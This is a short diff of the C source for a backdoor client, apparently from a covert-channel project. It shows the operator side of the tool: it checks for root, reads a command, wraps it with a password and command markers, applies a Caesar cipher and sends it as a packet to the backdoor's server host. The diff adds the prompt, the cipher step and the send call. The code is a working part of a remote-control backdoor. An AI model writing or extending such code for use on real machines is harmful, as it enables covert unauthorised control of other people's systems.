@@ -1,6 +1,5 @@
 #include "backdoor-client.h"
 
-
 int main(int argc, char **argv)
 {
 	/* Check to see if user is root */
@@ -20,7 +19,7 @@ int main(int argc, char **argv)
 	return 0;
 }
 int startClient(){
-	char buffer[BUF_LENGTH];
+	char buffer[BUF_LENGTH], encrypted_text[BUF_LENGTH];
 	int quit = FALSE;
 	pcap_t * nic_handle = NULL;
 	struct bpf_program fp;
@@ -39,12 +38,18 @@ int startClient(){
 			memset(buffer, 0, sizeof(buffer));
 		}
 		//read input
+		printf("Enter a command: ");
 		client.command = get_line(buffer, BUF_LENGTH, stdin);
 		if(strcmp(client.command, "quit") == 0){
 			quit = TRUE;
 		}
 		memset(buffer, 0, sizeof(buffer));
 		sprintf(buffer, "%s %d %s%s%s", client.password, SERVER_MODE, CMD_START, client.command, CMD_END);
+		
+		//Encrypt the data
+		strcpy(encrypted_text, ConvertCaesar(mEncipher, buffer, MOD, START));
+
+		send_packet(encrypted_text, get_ip_addr(NETWORK_INT), client.server_host, client.dst_port);
 		//clear buffer
 		memset(client.command, 0, BUF_LENGTH);
 	}
